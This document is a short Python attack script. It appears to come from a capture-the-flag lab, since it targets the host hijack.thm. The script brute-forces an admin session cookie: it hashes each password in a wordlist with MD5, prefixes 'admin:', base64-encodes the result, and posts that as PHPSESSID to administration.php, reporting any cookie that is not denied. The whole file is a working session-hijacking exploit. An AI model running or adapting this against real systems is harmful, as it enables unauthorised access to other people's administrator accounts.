#This script brute forces a session cookie until it finds one
import requests
import re 
import hashlib
import base64

file_path = 'password_list'  
passwords = []  
md5 = hashlib.md5()
_fail = r"Access denied"

with open(file_path, 'r') as file:
    for line in file:
        passwords.append(line.strip()) 
for password in passwords:

    hashed_password = hashlib.md5(str(password).encode('utf-8')).hexdigest()

    plain = "admin:" + hashed_password
    encoded_bytes = base64.b64encode(plain.encode('utf-8'))
    sessionid = encoded_bytes.decode('utf-8')

    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://hijack.thm',
            'Referer': 'http://hijack.thm/administration.php',
            'Cookie': 'PHPSESSID='+sessionid,
            'Upgrade-Insecure-Requests': '1'
    }
    url = 'http://hijack.thm/administration.php'

    response = requests.post(url, headers=headers)
    text = response.text
    fail = re.findall(_fail,text)
    if(len(fail) == 0):
        print("valid session found: " + sessionid)
